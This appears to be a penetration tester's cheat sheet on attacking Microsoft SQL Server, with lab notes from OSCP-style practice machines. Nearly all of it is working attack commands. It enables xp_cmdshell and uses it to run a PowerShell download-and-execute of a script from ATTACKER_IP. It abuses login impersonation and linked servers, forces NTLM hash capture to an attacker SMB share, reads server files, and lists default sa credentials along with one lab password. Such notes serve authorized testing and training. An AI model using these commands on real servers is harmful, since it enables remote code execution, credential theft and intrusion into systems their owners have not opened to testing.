# MSSQL - Port 1433

## Connect

```bash
# Impacket (preferred)
impacket-mssqlclient user:REDACTED -windows-auth
impacket-mssqlclient user:REDACTED

# sqsh
sqsh -S $IP -U user -P password
sqsh -S $IP -U 'domain\user' -P password
```

## Nmap

```bash
nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info -p 1433 $IP
```

## Enable xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

## Command Execution

```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\proof.txt';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')"';
```

## IMPERSONATE Check

```sql
-- Find impersonatable logins
SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

-- Execute as another login
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
```

## Linked Servers

```sql
-- Find linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [linked_server];
```

## Capture Hash (Relay Attack)

```bash
# On attacker: start responder or smbserver
sudo responder -I tun0
# or
impacket-smbserver share . -smb2support
```

```sql
-- On MSSQL
EXEC xp_dirtree '\\ATTACKER_IP\share';
-- or
EXEC xp_fileexist '\\ATTACKER_IP\share\test';
```

## Read Files

```sql
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
```

## Default Credentials

- `sa:(empty)`, `sa:sa`, `sa:REDACTED`

## See Also

- [[SQL-Injection]] | [[Nmap]] | [[AD-Methodology]]

## From Your Boxes

> **Hokkaido** (PG/Windows) - Authenticated to MSSQL with domain creds (`discovery:REDACTED!`). Default DBs only, but IMPERSONATE check found `hrappdb-reader`. Impersonated to access `hrappdb`, dumped `sysauth` table containing `hrapp-service:REDACTED`.
> - What worked: `impacket-mssqlclient 'hokkaido-aerospace.com/discovery':'Start123!'@TARGET_IP -windows-auth` then `EXECUTE AS LOGIN = 'hrappdb-reader'` and `SELECT * FROM sysauth`
> - Lesson: Always check IMPERSONATE privileges in MSSQL - you may access databases the current user cannot.

> **MS02 (OSCP C)** (Course) - MSSQL on port 1433, nmap scripts revealed domain info via `ms-sql-ntlm-info` (domain: `oscp.exam`, computer: `MS02`). The ntlm-info script is free domain recon without creds.
> - What worked: `nmap --script ms-sql-info,ms-sql-ntlm-info -p 1433 TARGET_IP`
> - Lesson: MSSQL ntlm-info script leaks domain name, computer name, and OS version with zero authentication required.
